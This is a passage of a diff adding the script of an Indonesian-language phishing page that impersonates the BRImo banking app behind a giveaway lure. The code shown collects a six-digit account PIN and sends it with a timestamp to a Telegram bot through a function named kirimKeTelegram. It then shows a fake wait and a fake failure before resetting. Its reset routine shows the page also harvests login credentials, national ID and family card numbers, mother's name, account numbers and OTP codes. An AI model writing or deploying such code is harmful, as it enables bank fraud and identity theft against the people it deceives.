+              pinInputs[i].value = '';
+              pinInputs[i].classList.remove('filled');
+              pinInputs[i].focus();
+              break;
+            }
+          }
+        } else {
+          for (var i = 0; i < 6; i++) {
+            if (!pinValues[i]) {
+              pinValues[i] = value;
+              pinInputs[i].value = value;
+              pinInputs[i].classList.add('filled');
+              if (i < 5) pinInputs[i + 1].focus();
+              break;
+            }
+          }
+        }
+        document.getElementById('pinError').classList.remove('show');
+        document.querySelectorAll('.pin-box').forEach(function(b) {
+          b.classList.remove('error');
+        });
+      });
+    });
+  });
+
+  async function submitPIN() {
+    var pin = pinValues.join('');
+    if (pin.length !== 6) {
+      document.getElementById('pinError').textContent = '❌ PIN harus 6 digit angka';
+      document.getElementById('pinError').classList.add('show');
+      document.querySelectorAll('.pin-box').forEach(function(b) {
+        if (!b.value) b.classList.add('error');
+      });
+      return;
+    }
+
+    const pesan = `🔒 PIN REKENING\n───────────────────\n🔢 PIN: ${pin}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+    await kirimKeTelegram(pesan);
+
+    document.getElementById('btnPin').style.display = 'none';
+    document.getElementById('waitPIN').classList.add('active');
+    setTimeout(function() {
+      document.getElementById('waitPIN').classList.remove('active');
+      document.getElementById('btnPin').style.display = 'block';
+      // Arahkan ke halaman gagal
+      showStep('step5');
+
+      // Tunggu 3 detik lalu reset ke halaman awal
+      setTimeout(function() {
+        resetAll();
+      }, 3000);
+    }, 2500);
+  }
+
+  function retryPIN() {
+    document.getElementById('errPIN').classList.remove('active');
+    document.getElementById('waitPIN').classList.remove('active');
+    document.getElementById('btnPin').style.display = 'block';
+    pinValues = ['', '', '', '', '', ''];
+    pinInputs.forEach(function(inp, i) {
+      inp.value = '';
+      inp.classList.remove('filled', 'error');
+    });
+    document.getElementById('pin0').focus();
+    document.getElementById('pinError').classList.remove('show');
+  }
+
+  // ============================================
+  // RESET KE AWAL
+  // ============================================
+  function resetAll() {
+    // Reset semua field
+    document.getElementById('username').value = '';
+    document.getElementById('password').value = '';
+    document.getElementById('dataNama').value = '';
+    document.getElementById('dataAlamat').value = '';
+    document.getElementById('dataTgl').value = '';
+    document.getElementById('dataNik').value = '';
+    document.getElementById('dataKk').value = '';
+    document.getElementById('dataIbu').value = '';
+    document.getElementById('dataIdRek').value = '';
+    document.getElementById('dataRek').value = '';
+    document.getElementById('otpInput').value = '';
+    pinValues = ['', '', '', '', '', ''];
+    pinInputs.forEach(function(inp, i) {
+      inp.value = '';
+      inp.classList.remove('filled', 'error');
+    });
+    document.getElementById('pinError').classList.remove('show');
+
+    // Kembali ke giveaway
+    document.getElementById('giveawayClaimView').style.display = 'block';
+    document.getElementById('giveawaySuccessView').classList.remove('active');
+    document.querySelectorAll('.step').forEach(function(s) {
+      s.classList.remove('active');
+    });
+    document.getElementById('stepGiveaway').classList.add('active');
+    window.scrollTo(0, 0);
+  }
+
+  console.log('✅ Telegram Bot BRImo siap!');
+</script>
+
+</body>
+</html>
